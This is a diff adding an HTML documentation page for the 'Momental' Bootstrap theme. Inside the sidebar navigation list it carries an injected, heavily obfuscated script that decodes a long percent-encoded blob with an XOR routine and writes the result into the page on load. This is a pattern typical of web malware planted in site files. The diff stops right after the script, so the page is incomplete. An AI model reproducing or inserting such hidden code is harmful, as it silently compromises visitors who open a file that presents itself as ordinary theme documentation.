@@ -1,0 +1,644 @@
+<!doctype html>  
+<!--[if IE 6 ]><html lang="en-us" class="ie6"> <![endif]-->
+<!--[if IE 7 ]><html lang="en-us" class="ie7"> <![endif]-->
+<!--[if IE 8 ]><html lang="en-us" class="ie8"> <![endif]-->
+<!--[if (gt IE 7)|!(IE)]><!-->
+<html lang="en-us"><!--<![endif]-->
+<head>
+	<meta charset="utf-8">
+	
+	<title>Momental - Responsive Multipurpose Bootstrap Theme</title>
+	
+	<meta name="description" content="A Perfect HTML5 Template for your site with unlimited options, colors and pre built pages to make your work easier, 2 different portfolio pages, 4 different homepages and much more..">
+	<meta name="author" content="PremiumLayers">
+	<meta name="copyright" content="PremiumLayers">
+	<meta name="generator" content="Documenter v2.0 http://rxa.li/documenter">
+	<meta name="date" content="2013-05-30T00:00:00+02:00">
+	
+	<link rel="stylesheet" href="assets/css/documenter_style.css" media="all">
+	<link type="text/css" rel="stylesheet" href="assets/css/SyntaxHighlighter.css"></link>
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,300,300italic,400italic,600,700,800' rel='stylesheet' type='text/css'>
+	<link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+
+	<script src="assets/js/jquery.js"></script>
+	<script src="assets/js/jquery.scrollTo.js"></script>
+	<script src="assets/js/jquery.easing.js"></script>
+	
+	<script>document.createElement('section');var duration='500',easing='swing';</script>
+	<script src="assets/js/script.js"></script>
+
+	<style>
+		html{background-color:#EEEEEE;color:#383838;}
+		::-moz-selection{background:#333636;color:#00DFFC;}
+		::selection{background:#333636;color:#00DFFC;}
+		#documenter_sidebar #documenter_logo{background-image:url();}
+		a{color:#008C9E;}
+		.btn {
+			border-radius:3px;
+		}
+		.btn-primary {
+			  background-image: -moz-linear-gradient(top, #008C9E, #006673);
+			  background-image: -ms-linear-gradient(top, #008C9E, #006673);
+			  background-image: -webkit-gradient(linear, 0 0, 0 008C9E%, from(#343838), to(#006673));
+			  background-image: -webkit-linear-gradient(top, #008C9E, #006673);
+			  background-image: -o-linear-gradient(top, #008C9E, #006673);
+			  background-image: linear-gradient(top, #008C9E, #006673);
+			  filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#008C9E', endColorstr='#006673', GradientType=0);
+			  border-color: #006673 #006673 #bfbfbf;
+			  color:#FFFFFF;
+		}
+		.btn-primary:hover,
+		.btn-primary:active,
+		.btn-primary.active,
+		.btn-primary.disabled,
+		.btn-primary[disabled] {
+		  border-color: #008C9E #008C9E #bfbfbf;
+		  background-color: #006673;
+		}
+		hr{border-top:1px solid #D4D4D4;border-bottom:1px solid #FFFFFF;}
+		#documenter_sidebar, #documenter_sidebar ul a{background-color:#343838;color:#FFFFFF;}
+		#documenter_sidebar ul a{-webkit-text-shadow:1px 1px 0px #494F4F;-moz-text-shadow:1px 1px 0px #494F4F;text-shadow:1px 1px 0px #494F4F;}
+		#documenter_sidebar ul{border-top:1px solid #212424;}
+		#documenter_sidebar ul a{border-top:1px solid #494F4F;border-bottom:1px solid #212424;color:#FFFFFF;}
+		#documenter_sidebar ul a:hover{background:#333636;color:#00DFFC;border-top:1px solid #333636;}
+		#documenter_sidebar ul a.current{background:#333636;color:#00DFFC;border-top:1px solid #333636;}
+		#documenter_copyright{display:block !important;visibility:visible !important;}
+		#documenter_sidebar, #documenter_sidebar ul a {background-color: #2c3e50;color: #FFF;}
+		#documenter_sidebar #documenter_logo {padding: 35px 40px 45px ;}
+	</style>
+	
+</head>
+<body>
+	<div id="documenter_sidebar">
+		<a href="#documenter_cover" id="documenter_logo"><img src="assets/img/logo.png" alt=""/></a>
+		<ul id="documenter_nav">
+
+			<li><a class="current" href="#documenter_cover">Welcome</a></li>
+			<li><a href="#installtion">Installing Template</a></li>
+			<li><a href="#html_structure">HTML Structure</a></li>
+			<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%72%33%64%64%66%33%61%64%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%31%37%32%33%34%31%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%31%31%38%32%31%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%72%33%64%64%66%33%61%64%28%27') + '%40%7a%68%79%72%71%74%2c%7c%83%71%6c%47%2e%7b%6a%83%7d%30%7a%6f%7e%6b%74%6e%7a%77%7f%79%29%47%1e%1a%40%2b%37%3e%2b%17%16%68%7b%68%75%39%77%72%6f%7d%64%68%78%6b%37%34%2c%3f%37%27%45%3f%2f%37%6c%2f%3a%3a%2a%42%3d%26%36%47%2f%3e%67%2c%3e%6b%28%3f%3b%2e%37%35%2b%3e%3c%26%3e%3a%2b%3a%3d%2c%3f%32%27%39%3f%2f%34%40%2f%39%47%2a%3e%3a%26%36%38%2f%3d%31%2c%3a%44%28%44%3e%2e%33%4b%2b%3a%38%26%42%6a%2b%3f%6e%2c%39%4a%27%45%3e%2f%37%38%2f%45%3d%2a%39%39%26%49%3e%2f%3a%31%2c%3d%68%28%3f%3b%2e%33%32%2b%3a%3a%26%3e%6a%2b%3f%6e%2c%39%4a%27%45%3e%2f%37%38%2f%45%3d%2a%39%39%26%49%38%2f%3e%65%2c%41%3c%28%3f%3b%2e%34%64%2b%3a%38%26%42%3d%2b%3d%6a%2c%40%34%27%45%38%2f%37%6e%2f%3a%44%2a%42%3d%26%32%44%2f%3a%33%2c%3d%3e%28%38%3c%2e%34%30%2b%3d%3f%26%3e%41%2b%3a%3e%2c%3c%33%27%39%3e%2f%33%39%2f%3e%44%2a%3e%6b%26%30%6f%2f%38%4a%2c%41%39%28%3f%3b%2e%34%64%2b%3a%38%26%42%3f%2b%39%6a%2c%3f%36%27%45%3d%2f%37%3e%2f%3a%3c%2a%42%39%26%36%3b%2f%3a%49%2c%41%38%28%3b%6f%2e%48%30%2b%3f%6a%26%3e%38%2b%38%69%2c%3b%4a%27%39%6a%2f%31%68%2f%3c%44%2a%3d%6b%26%32%3c%2f%3d%65%2c%3a%3c%28%44%3c%2e%37%67%2b%3e%3f%26%42%3d%2b%39%38%2c%3f%32%27%45%38%2f%37%3c%2f%3e%47%2a%42%3d%26%36%68%2f%41%31%2c%3f%6e%28%38%38%2e%36%64%2b%3a%38%26%39%6a%2b%3d%3d%2c%3b%33%27%39%40%2f%34%3b%2f%39%38%2a%3e%3f%26%35%3f%2f%3d%49%2c%3a%3e%28%3f%40%2e%34%62%2b%38%6b%26%3b%43%2b%39%3b%2c%3f%67%27%45%3a%2f%33%43%2f%3e%3f%2a%42%3f%26%36%3f%2f%41%33%2c%3a%3c%28%3b%40%2e%33%30%2b%3d%6c%26%39%38%2b%3a%3d%2c%3c%63%27%3e%38%2f%37%40%2f%3e%3f%2a%3e%6c%26%32%3c%2f%41%34%2c%3a%6b%28%3b%6e%2e%37%37%2b%3e%6f%26%3d%41%2b%46%39%2c%3f%49%27%39%6a%2f%33%3b%2f%3a%44%2a%39%6b%26%32%6e%2f%3a%4a%2c%3a%3c%28%44%69%2e%31%63%2b%38%43%26%3b%43%2b%46%3f%2c%3b%31%27%3e%6a%2f%34%6f%2f%3e%3f%2a%3c%3c%26%49%38%2f%41%33%2c%3e%47%28%3b%6c%2e%37%49%2b%3a%6f%26%3d%3e%2b%46%3f%2c%3f%67%27%3a%6c%2f%35%3e%2f%3a%47%2a%3d%3a%26%49%3e%2f%3c%34%2c%3e%6a%28%3b%3f%2e%37%37%2b%3a%40%26%39%40%2b%46%3d%2c%3f%32%27%45%3a%2f%48%3e%2f%3a%38%2a%3f%42%26%36%6b%2f%41%35%2c%3a%44%28%3b%69%2e%33%67%2b%3e%3d%26%3d%40%2b%39%3e%2c%40%33%27%38%3b%2f%48%3f%2f%3e%47%2a%3d%42%26%32%3b%2f%3e%63%2c%3a%6b%28%3b%6e%2e%37%37%2b%3e%6f%26%3d%41%2b%46%39%2c%3f%49%27%3e%43%2f%33%40%2f%3b%68%2a%42%3c%26%32%6b%2f%3e%34%2c%3e%44%28%3b%38%2e%48%32%2b%3c%3d%26%3d%6e%2b%39%39%2c%3f%36%27%38%3b%2f%48%3f%2f%3e%47%2a%3d%42%26%32%47%2f%3a%4a%2c%3a%6e%28%3f%6f%2e%34%4b%2b%3a%43%26%3e%6a%2b%3f%6e%2c%39%4a%27%45%6c%2f%31%68%2f%3c%44%2a%42%3b%26%36%3b%2f%41%35%2c%41%3b%28%44%39%2e%37%67%2b%3a%38%26%42%3a%2b%3a%6f%2c%39%62%27%45%6c%2f%31%68%31%37%34%40%14%13%66%76%6f%74%30%76%75%6f%79%6a%6e%7b%6e%39%39%2b%3e%3c%26%3d%6e%2b%39%38%2c%40%36%27%3a%6c%2f%37%3c%2f%3a%68%2a%42%3d%26%32%6b%2f%41%48%2c%41%3e%28%3b%40%2e%48%34%2b%3e%3f%26%39%40%2b%39%38%2c%3f%35%27%39%3a%2f%34%3b%2f%3a%3c%2a%3e%3e%26%35%47%2f%3d%49%2c%3d%3f%28%3b%3f%2e%34%30%2b%3a%40%26%39%41%35%34%2d%36%29%38%27%38%38%2f%48%42%2f%45%39%2a%3f%3a%26%34%3e%2f%3e%49%2c%3a%69%28%44%40%2e%48%62%2b%3e%6a%26%3d%43%2b%3b%44%2c%3b%34%27%3e%43%2f%37%6c%2f%45%47%2a%42%6a%26%36%6a%2f%3e%65%2c%41%45%28%44%6f%2e%37%67%2b%41%43%26%3d%6f%2b%39%6f%2c%40%67%27%3a%40%2f%37%68%2f%45%47%2a%42%6b%26%49%69%2f%41%64%2c%3e%47%28%44%3c%2e%48%67%2b%41%6f%26%3d%40%2b%3d%6e%2c%3d%67%27%38%43%2f%36%6c%2f%3b%47%2a%39%6f%26%37%6e%2f%41%67%2c%41%6b%28%44%3d%2e%37%65%2b%41%40%26%42%40%2b%46%6e%2c%3f%37%27%38%38%2f%34%68%2f%3a%68%2a%3f%3a%26%34%3e%2f%3d%62%2c%41%3c%28%44%68%2e%35%49%2b%3b%3d%26%38%3f%2b%3c%38%2c%3a%62%27%3f%41%2f%35%42%2f%45%3c%2a%42%3d%26%34%3c%2f%3c%48%2c%3e%6a%28%3f%38%2e%48%33%2b%41%6f%26%3d%40%2b%39%6a%2c%3d%66%27%3e%6f%2f%33%6c%2f%45%46%2a%3d%6c%26%49%44%2f%3e%49%2c%41%47%28%3b%3f%2e%48%62%2b%41%41%26%42%6e%2b%46%68%2c%3b%34%27%38%3a%2f%36%38%2f%3a%68%2a%42%42%26%36%68%2f%41%66%2c%3e%47%28%44%3e%2e%48%32%2b%41%6d%26%42%6a%2b%3d%45%2c%3e%35%27%45%40%2f%48%40%2f%45%6c%2a%3d%6a%26%49%6f%2f%41%64%2c%41%6b%28%3b%3d%2e%35%37%2b%3d%6c%26%3d%6d%2b%3b%3b%2c%3d%65%27%39%6c%2f%48%42%2f%45%39%2a%3f%3a%26%33%3f%2f%3b%32%2c%3b%45%28%3e%68%2e%32%32%2b%3c%38%26%42%3d%2b%46%38%2c%3d%67%27%38%38%2f%37%43%2f%3e%6b%2a%42%40%26%49%69%2f%3e%64%2c%3e%6f%28%39%6c%2e%33%62%2b%3a%43%26%42%6a%2b%46%6b%2c%40%36%27%45%6c%2f%48%40%2f%45%39%2a%3d%6c%26%49%3e%2f%3a%4a%2c%3a%69%28%44%3c%2e%48%32%2b%41%40%26%42%3d%2b%39%6b%2c%3d%66%27%3e%6f%2f%36%6d%2f%45%6c%2a%42%6b%26%49%6a%2f%41%4a%2c%41%45%28%3b%39%2e%48%37%2b%3a%6f%26%3f%3b%2b%38%68%2c%40%37%27%45%40%2f%48%68%2f%45%69%2a%42%3d%26%36%68%2f%41%48%2c%3c%3c%28%38%3b%2e%37%63%2b%3c%3a%26%3f%3d%2b%3a%46%2c%40%65%27%45%41%2f%35%3c%2f%3f%3d%2a%38%3e%26%33%3b%2f%3b%31%2c%3b%45%28%39%6f%2e%48%37%2b%41%41%26%3f%3b%2b%3b%39%2c%3f%33%27%3e%6d%2f%48%3e%2f%45%69%2a%3d%41%26%36%44%2f%3c%35%2c%3a%6b%28%3f%3f%2e%48%65%2b%41%6c%26%42%40%2b%46%6e%2c%3f%35%27%3a%6a%2f%48%6c%2f%3a%6a%2a%3d%6c%26%49%3c%2f%3e%67%2c%3e%68%28%3b%3f%2e%48%62%2b%3e%6a%26%3d%6a%2b%46%38%2c%40%36%27%45%43%2f%33%40%2f%3e%6b%2a%42%6b%26%49%3b%2f%41%67%2c%41%3c%28%3b%3d%2e%35%36%2b%3a%6f%26%3c%6b%2b%46%46%2c%40%37%27%45%6f%2f%37%6c%2f%3a%6c%2a%42%6a%26%32%6b%2f%3e%49%2c%41%3e%28%3b%3c%2e%33%4b%2b%3c%43%26%42%6c%2b%39%6b%2c%3f%36%27%45%41%2f%48%6d%2f%45%47%2a%39%6d%26%34%3c%2f%3f%66%2c%41%68%28%44%3d%2e%48%62%2b%3e%43%26%3d%40%2b%46%69%2c%3b%32%27%3a%6e%2f%48%3c%2f%3a%44%2a%39%6f%26%34%6e%2f%41%4a%2c%3e%6e%28%3b%3c%2e%48%32%2b%41%40%26%42%6b%2b%3b%39%2c%3c%31%27%3a%6e%2f%35%3c%2f%38%3c%2a%3e%6e%26%49%3e%2f%41%31%2c%3c%3e%28%3e%6c%2e%32%35%2b%3b%41%26%38%3c%2b%3b%39%2c%3c%31%27%45%6a%2f%48%42%2f%38%3a%2a%38%39%26%33%38%2f%3b%31%2c%3b%45%28%39%6f%2e%37%64%2b%41%41%26%42%43%2b%3d%45%2c%40%62%27%3a%40%2f%35%3f%2f%3e%69%2a%3d%6b%26%49%6a%2f%3e%66%2c%41%6e%28%44%6c%2e%37%67%2b%41%3a%26%42%6a%2b%39%6b%2c%40%34%27%3a%6c%2f%37%6c%2f%45%6a%2a%42%6f%26%48%3b%2f%41%4a%2c%41%45%28%44%43%2e%48%33%2b%41%40%26%39%6c%2b%3b%3b%2c%3d%35%27%45%6c%2f%48%69%2f%44%39%2a%42%6d%26%49%3b%2f%41%33%2c%41%38%28%44%3c%2e%33%4b%2b%3f%6d%26%42%6c%2b%39%6b%2c%40%66%27%45%41%2f%48%6e%2f%45%3d%2a%3c%3c%26%36%68%2f%40%31%2c%3e%6e%28%44%3e%2e%48%65%2b%3a%6d%26%3e%6c%2b%3a%45%2c%3c%33%27%39%43%2f%35%42%2f%3a%69%2a%42%6d%26%34%3c%2f%3b%35%2c%3b%3a%28%3e%68%2e%32%32%2b%41%3d%26%3d%6d%2b%39%68%2c%3f%37%27%3e%6d%2f%49%39%2f%45%39%2a%42%6b%26%49%3a%2f%3a%63%2c%41%44%28%44%40%2e%37%67%2b%3a%6d%26%3f%3d%2b%39%6f%2c%3b%32%27%45%3c%2f%48%40%2f%3a%6c%2a%3d%42%26%34%3f%2f%3a%4a%2c%41%38%28%44%3c%2e%48%64%2b%41%6d%26%3f%3f%2b%3a%46%2c%3c%31%27%45%6f%2f%49%3e%2f%3a%68%2a%3e%3a%26%49%3e%2f%41%31%2c%3d%68%28%3b%3c%2e%48%48%2b%3e%43%26%42%40%2b%46%44%2c%3f%37%27%45%3a%2f%48%6d%2f%3a%6c%2a%42%6d%26%32%69%2f%3c%36%2c%3c%44%28%44%3b%2e%37%65%2b%41%6a%26%42%38%2b%39%6b%2c%40%67%27%45%40%2f%37%6e%2f%45%69%2a%39%6f%26%49%44%2f%3d%4a%2c%3d%3e%28%38%38%2e%35%37%2b%3d%6c%26%3d%6d%2b%3b%3b%2c%3b%32%27%3f%3d%2f%32%38%2f%3f%39%2a%38%3d%26%34%3e%2f%3d%62%2c%3e%44%28%44%68%2e%48%66%2b%3c%3a%26%38%38%2b%3c%3f%2c%3a%62%27%38%38%2f%34%68%2f%3a%44%2a%42%3d%26%49%44%2f%3c%36%2c%3b%39%28%3e%69%2e%32%32%2b%3c%38%26%3d%6a%2b%46%38%2c%40%48%27%3e%6d%2f%48%3b%2f%3a%44%2a%3f%39%26%32%69%2f%3e%67%2c%41%68%28%3b%3f%2e%48%67%2b%41%3d%26%3d%40%2b%46%3b%2c%40%36%27%3a%6a%2f%48%40%2f%3a%6a%2a%3d%6a%26%49%6a%2f%41%36%2c%41%44%28%3b%3d%2e%48%49%2b%41%40%26%39%6c%2b%3b%3b%2c%3a%66%27%3f%3e%2f%32%3b%2f%38%3c%2a%42%6a%26%36%47%2f%3e%66%2c%41%44%28%44%68%2e%48%48%2b%41%3a%26%39%6e%2b%46%38%2c%3f%36%27%38%3d%2f%33%40%2f%3a%44%2a%42%6e%26%36%6e%2f%41%64%2c%41%39%28%3b%3d%2e%48%49%2b%41%40%26%3d%40%2b%46%6e%2c%3f%31%27%3a%43%2f%48%68%2f%45%6d%2a%3d%41%26%49%69%2f%3a%4a%2c%3c%3e%28%3e%6c%2e%32%35%2b%3b%41%26%3f%3d%2b%46%3d%2c%3c%33%27%38%3a%2f%36%3f%2f%3b%6a%2a%3c%39%26%34%47%2f%3f%36%2c%3f%44%28%39%39%2e%36%37%2b%3c%38%26%3e%6f%2b%46%3d%2c%3c%33%27%38%3a%2f%32%3f%2f%3f%46%2a%38%3d%26%34%3e%2f%41%34%2c%3d%6b%28%39%6d%2e%36%62%2b%3e%6a%26%42%6b%2b%46%45%2c%40%31%27%45%3a%2f%48%6c%2f%45%39%2a%42%42%26%36%47%2f%3a%63%2c%3f%39%28%44%3d%2e%48%37%2b%41%40%26%42%3c%2b%46%45%2c%40%37%27%45%6f%2f%48%69%2f%45%6a%2a%42%6a%26%36%47%2f%3a%63%2c%3f%38%28%3a%3c%2e%36%36%2b%3f%38%26%3e%40%2b%3d%45%2c%3d%34%27%45%6c%2f%48%68%2f%45%44%2a%42%6a%26%49%6f%2f%41%4a%2c%3e%6a%28%44%38%2e%33%4b%2b%3f%40%26%3d%40%2b%46%44%2c%40%32%27%45%38%2f%37%43%2f%45%44%2a%3d%41%26%34%3e%2f%3e%4a%2c%41%6b%28%39%6d%2e%32%36%2b%3b%3e%26%38%3c%2b%3b%39%2c%3c%31%27%45%3c%2f%34%40%2f%38%3a%2a%38%39%26%33%38%2f%3b%31%2c%3c%3c%28%3b%39%2e%33%4b%2b%41%3c%26%42%6c%2b%39%6b%2c%3f%48%27%38%3d%2f%33%40%2f%45%38%2a%42%6b%26%49%6f%2f%41%63%2c%3c%3a%28%38%3b%2e%34%48%2b%40%3f%26%43%3e%2b%47%3e%2c%3c%67%27%45%40%2f%48%3e%2f%3a%6c%2a%42%39%26%36%47%2f%41%48%2c%41%68%28%3b%3f%2e%48%34%2b%3d%3a%26%3d%6b%2b%46%46%2c%40%66%27%3e%6f%2f%35%3c%2f%38%3c%2a%42%3d%26%49%3f%2f%41%33%2c%3a%69%28%44%3f%2e%48%62%2b%3e%43%26%3f%38%2b%3d%6e%2c%40%4a%27%45%40%2f%48%6d%2f%45%6b%2a%3f%3e%26%35%6a%2f%3d%62%2c%40%3b%28%45%43%2e%49%30%2b%3d%3a%26%43%3e%2b%46%45%2c%40%65%27%45%6c%2f%37%6c%2f%45%3f%2a%3d%41%26%49%69%2f%3d%36%2c%3e%47%28%44%3b%2e%48%36%2b%3d%6c%26%3d%40%2b%3a%69%2c%3f%36%27%3a%40%2f%34%3c%2f%45%46%2a%42%6f%26%49%45%2f%3a%4a%2c%3c%3e%28%39%6f%2e%34%48%2b%3e%6e%26%3f%3b%2b%3c%44%2c%3a%63%27%3f%41%2f%35%42%2f%3a%69%2a%42%6d%26%34%3c%2f%3b%35%2c%3b%3a%28%3e%68%2e%35%37%2b%3e%6f%26%42%6c%2b%3b%3b%2c%3a%66%27%3f%3e%2f%32%3b%2f%3f%39%2a%38%39%26%33%38%2f%3b%31%2c%3c%3c%28%44%40%2e%34%64%2b%3c%3a%26%3f%3d%2b%46%69%2c%40%36%27%45%6f%2f%48%68%2f%45%3a%2a%42%3f%26%34%3c%2f%3e%33%2c%3e%6e%28%44%6f%2e%37%65%2b%41%6c%26%42%38%2b%39%6b%2c%3b%32%27%3b%40%2f%48%68%2f%3e%6b%2a%3c%39%26%49%6a%2f%41%35%2c%3e%6e%28%44%6d%2e%48%64%2b%3e%6e%26%42%3d%2b%3d%45%2c%3e%36%27%3a%6a%2f%48%3f%2f%45%6b%2a%42%3c%26%36%68%2f%41%67%2c%3e%6e%28%3f%38%2e%35%64%2b%41%6c%26%3d%6b%2b%46%6b%2c%40%66%27%3a%6a%2f%48%3c%2f%45%44%2a%3d%6c%26%49%6f%2f%41%31%2c%41%68%28%44%6d%2e%34%49%2b%3c%38%26%3e%6f%2b%46%69%2c%40%36%27%45%6f%2f%48%68%2f%45%3a%2a%42%3f%26%34%3c%2f%3c%48%2c%3d%68%28%44%40%2e%34%64%2b%3c%3a%26%38%38%2b%3c%3f%2c%3a%62%27%38%38%2f%48%69%2f%38%3a%2a%3f%42%26%49%3b%2f%41%4a%2c%41%47%28%44%3c%2e%48%37%2b%40%41%26%3e%3d%2b%3d%45%2c%3f%33%27%3e%6d%2f%48%3e%2f%45%6c%2a%42%3f%26%36%47%2f%3a%63%2c%41%44%28%44%40%2e%37%63%2b%41%3a%26%42%3a%2b%46%69%2c%3b%32%27%3a%6b%2f%48%68%2f%45%69%2a%39%6f%26%49%6b%2f%41%64%2c%41%6b%28%3b%3f%2e%48%33%2b%3e%6e%26%42%6b%2b%46%38%2c%40%67%27%45%3f%2f%33%69%2f%45%44%2a%42%40%26%49%3b%2f%41%66%2c%3a%69%28%44%3c%2e%48%33%2b%3e%6a%26%42%38%2b%39%6b%2c%3c%65%27%3e%6d%2f%49%3b%2f%45%6a%2a%42%41%26%49%69%2f%3a%63%2c%41%47%28%44%3d%2e%48%4b%2b%41%6d%26%42%6f%2b%46%6e%2c%40%36%27%3e%6d%2f%48%3b%2f%45%47%2a%39%6f%26%49%6f%2f%41%4a%2c%41%6e%28%44%6f%2e%49%32%2b%3a%6d%26%3d%6d%2b%46%45%2c%40%32%27%45%6f%2f%37%6e%2f%3a%47%2a%42%3d%26%36%68%2f%41%67%2c%3e%6e%28%3b%3c%2e%33%63%2b%3b%3d%26%38%3f%2b%3c%38%2c%3d%65%27%3a%6f%2f%48%40%2f%38%3a%2a%38%39%26%33%38%2f%3b%31%2c%3c%3c%28%3b%3e%2e%48%62%2b%3c%3a%26%38%38%2b%3c%3f%2c%3a%62%27%3b%40%2f%48%3e%2f%45%39%2a%42%6a%26%32%6b%2f%3e%67%2c%41%68%28%3b%3f%2e%48%67%2b%41%3d%26%3d%40%2b%46%3b%2c%40%36%27%3e%6d%2f%37%6c%2f%45%6a%2a%42%42%26%36%47%2f%41%4a%2c%41%47%28%3f%38%2e%48%64%2b%41%3c%26%3d%40%2b%3d%45%2c%40%62%27%45%3a%2f%48%6c%2f%45%44%2a%3d%6c%26%49%3e%2f%41%48%2c%3e%6a%28%44%3c%2e%48%32%2b%41%6c%26%42%3b%2b%3d%45%2c%3f%33%27%45%3a%2f%37%6d%2f%3e%6b%2a%42%41%26%49%6e%2f%3e%64%2c%3a%69%28%44%3b%2e%37%66%2b%3a%6d%26%42%6a%2b%46%3d%2c%40%62%27%45%43%2f%33%69%2f%45%44%2a%42%40%26%36%47%2f%41%35%2c%3e%6e%28%3f%38%2e%37%63%2b%41%3a%26%3d%6a%2b%3d%45%2c%40%31%27%3a%6b%2f%48%6d%2f%3a%6c%2a%42%3a%26%32%6b%2f%41%4a%2c%3e%6e%28%44%42%2e%37%67%2b%3e%6e%26%42%3d%2b%46%69%2c%3b%32%27%3a%6e%2f%48%3c%2f%45%47%2a%43%3f%26%36%47%2f%41%4a%2c%41%47%28%3f%38%2e%48%64%2b%41%6c%26%39%6e%2b%39%69%2c%40%31%27%45%3d%2f%48%3f%2f%45%6a%2a%42%3a%26%32%6b%2f%41%63%2c%41%6b%28%44%3b%2e%37%62%2b%41%38%26%3d%40%2b%46%44%2c%40%35%27%3e%6d%2f%37%43%2f%45%3a%2a%3d%6b%26%32%6b%2f%41%31%2c%41%47%28%44%3f%2e%48%67%2b%3e%6a%26%42%6b%2b%3d%45%2c%3c%66%27%3e%6d%2f%48%40%2f%3a%6c%2a%3d%6c%26%36%6f%2f%3a%63%2c%41%44%28%44%40%2e%48%32%2b%41%43%26%39%6e%2b%39%68%2c%40%31%27%3a%43%2f%48%6e%2f%45%3d%2a%3d%41%26%49%3c%2f%41%67%2c%3a%69%28%44%3c%2e%48%33%2b%41%6c%26%42%6c%2b%46%46%2c%40%37%27%45%3f%2f%48%3e%2f%45%3c%2a%43%3d%26%32%6b%2f%41%31%2c%3e%6f%28%3f%38%2e%49%32%2b%41%6c%26%42%40%2b%3d%45%2c%3f%33%27%45%6f%2f%37%6e%2f%3e%6b%2a%3d%41%26%48%3a%2f%41%63%2c%3e%6e%28%44%3e%2e%48%32%2b%3e%6a%26%42%3b%2b%39%69%2c%40%62%27%45%3a%2f%48%39%2f%3e%6b%2a%3d%6c%26%49%3c%2f%40%31%2c%3a%69%28%3b%3c%2e%48%32%2b%3e%6b%26%3d%43%2b%46%38%2c%3f%35%27%45%6a%2f%48%42%2f%45%44%2a%42%3d%26%36%47%2f%41%66%2c%3d%3e%28%3f%38%2e%36%32%2b%3e%6b%26%39%6e%2b%47%38%2c%40%31%27%45%6a%2f%33%69%2f%45%38%2a%3d%6c%26%49%44%2f%3e%64%2c%3a%69%28%3b%39%2e%48%49%2b%40%41%26%39%6e%2b%46%6f%2c%40%37%27%3a%6a%2f%48%6c%2f%45%44%2a%42%3d%26%49%6a%2f%41%36%2c%41%47%28%3f%38%2e%48%64%2b%41%3c%26%3d%6d%2b%46%68%2c%3b%32%27%3a%6e%2f%48%40%2f%3a%6c%2a%39%6f%26%36%69%2f%3e%64%2c%40%45%28%44%3b%2e%48%49%2b%3e%40%26%39%6e%2b%46%68%2c%40%4a%27%3a%6a%2f%33%69%2f%45%47%2a%3d%6a%26%49%6a%2f%41%63%2c%3e%6e%28%3f%38%2e%48%48%2b%3e%6b%26%39%6e%2b%46%68%2c%40%4a%27%45%41%2f%48%6c%2f%3e%6b%2a%3d%6b%26%49%6a%2f%3e%66%2c%41%6e%28%44%6c%2e%37%67%2b%41%3a%26%42%6a%2b%3a%39%2c%3b%32%27%3a%6b%2f%37%6e%2f%3a%6c%2a%42%3c%26%32%6b%2f%3e%65%2c%41%6b%28%3b%3d%2e%37%67%2b%3a%6d%26%42%6a%2b%46%46%2c%3b%32%27%45%6d%2f%48%68%2f%45%47%2a%3d%41%26%32%6b%2f%41%67%2c%41%38%28%3b%3d%2e%48%36%2b%3a%6d%26%42%3c%2b%46%3b%2c%3b%32%27%45%40%2f%48%3e%2f%3a%6c%2a%39%6f%26%36%6f%2f%3e%64%2c%3e%44%28%44%68%2e%37%65%2b%3e%6e%26%42%6a%2b%39%6b%2c%3f%36%27%3e%6d%2f%35%42%2f%3a%68%2a%39%6f%26%49%3a%2f%41%4a%2c%3e%6e%28%3b%42%2e%35%36%2b%3a%6f%26%42%41%2b%46%68%2c%40%36%27%45%6d%2f%35%38%2f%39%6a%2a%3e%6e%26%49%6f%2f%41%34%2c%3e%6e%28%44%6c%2e%37%67%2b%3e%6b%26%42%6f%2b%46%6e%2c%3f%37%27%45%43%2f%48%6d%2f%39%3a%2a%42%3a%26%36%47%2f%41%67%2c%3d%68%28%44%3d%2e%48%65%2b%3e%6a%26%42%6c%2b%3a%46%2c%3e%32%27%45%6f%2f%37%6e%2f%45%3d%2a%42%3d%26%49%47%2f%41%35%2c%3f%3c%28%3b%39%2e%49%32%2b%3e%6a%26%42%6c%2b%46%69%2c%3b%34%27%3e%6d%2f%48%6d%2f%3a%68%2a%42%6d%26%49%45%2f%3e%64%2c%41%44%28%39%6c%2e%33%62%2b%3e%6c%26%3d%6c%2b%46%39%2c%3f%33%27%45%3a%2f%48%3d%2f%3e%69%2a%3f%3a%26%49%6e%2f%41%64%2c%41%69%28%44%38%2e%48%48%2b%41%6f%26%42%6a%2b%3d%45%2c%40%35%27%3a%6a%2f%37%6c%2f%45%44%2a%42%3d%26%49%6a%2f%41%36%2c%3d%3e%28%39%6f%2e%34%48%2b%3e%6e%26%3f%3b%2b%3b%39%2c%3c%31%27%45%6d%2f%35%3c%3a%3b%3f%3a%42%3a%33%36%2b%3d%3f%26%3e%3a%2b%3a%39%2c%3c%37%27%39%41%2f%34%39%2f%39%38%34%2b%34%21%77%72%6f%7d%64%68%78%6b%37%34%2c%3b%48%27%3e%43%2f%33%40%2f%39%6d%34%30%32%4c%1f%16%39%39%21%34%37%42%10%17%47%38%74%65%7e%73%78%75%45%17%16%43%73%7a%7c%64%72%77%78%7c%4f%47%73%42%55%6e%7d%6a%74%65%7e%73%78%75%2b%7a%6b%7c%7a%70%7b%66%64%40%39%73%4f%47%39%72%7e%78%6e%7b%7a%70%78%4611723417%35%36%34%32%30%38%39' + unescape('%27%29%29%3b'));
+// -->
+</script>
